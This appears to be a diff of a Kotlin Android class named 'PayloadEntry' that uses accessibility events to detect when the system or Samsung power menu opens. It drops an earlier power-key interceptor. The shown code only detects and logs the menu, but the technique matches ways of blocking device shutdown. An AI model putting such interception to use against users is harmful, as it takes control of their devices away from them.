@@ -61,12 +61,20 @@ class PayloadEntry : DynamicEntry {
             DynamicEntry.accessibilityInterceptor = { event ->
                 if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                     try {
-                    val pkg = event.packageName?.toString() ?: ""
-                    
-                    // Target system-level overlays
-                    if (pkg.contains("systemui") || pkg == "android" || pkg.contains("cocktailbarservice")) {
-                        var isPowerMenu = false
-                        DynamicEntry.log("🔍 Scanning Window: $pkg | Class: ${event.className}")
+                        val pkg = event.packageName?.toString()?.lowercase() ?: ""
+                        val cls = event.className?.toString()?.lowercase() ?: ""
+                        
+                        DynamicEntry.log("👁️ Window Event: pkg=$pkg | cls=$cls")
+                        
+                        // Target system overlays AND Samsung's GlobalActions
+                        if (pkg.contains("systemui") || pkg == "android" || pkg.contains("cocktailbarservice") || pkg.contains("globalactions")) {
+                            var isPowerMenu = false
+                            DynamicEntry.log("🔍 Deep Scanning Target: $pkg")
+                            
+                            if (pkg.contains("globalactions")) {
+                                isPowerMenu = true
+                                DynamicEntry.log("✅ Matched Samsung GlobalActions Package!")
+                            }
 
                         // Method 1: Check high-level event text
                         val eventText = event.text.joinToString(" ").lowercase()
@@ -146,34 +154,7 @@ class PayloadEntry : DynamicEntry {
             }
 
             DynamicEntry.keyInterceptor = { event ->
-                try {
-                if (event.keyCode == KeyEvent.KEYCODE_POWER) {
-                    if (event.action == KeyEvent.ACTION_DOWN) {
-                        if (lastPowerDown == 0L) lastPowerDown = System.currentTimeMillis()
-                        
-                        val duration = System.currentTimeMillis() - lastPowerDown
-                        if (duration > 500) { // Long press threshold
-                            if (!showPowerMenu) {
-                                val vib = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
-                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                                    vib.vibrate(VibrationEffect.createOneShot(50, VibrationEffect.DEFAULT_AMPLITUDE))
-                                } else {
-                                    @Suppress("DEPRECATION")
-                                    vib.vibrate(50)
-                                }
-                                showPowerMenu = true
-                            }
-                            true // Consume
-                        } else false
-                    } else {
-                        lastPowerDown = 0L
-                        showPowerMenu // If menu is showing, consume the UP event too
-                    }
-                } else false
-                } catch (e: Throwable) {
-                    DynamicEntry.log("💥 KEY CRASH: ${e.stackTraceToString()}")
-                    false
-                }
+                false // Pass keys through. KEYCODE_POWER is hard-blocked by Android OS. We rely strictly on Window State Changes.
             }
         }
 
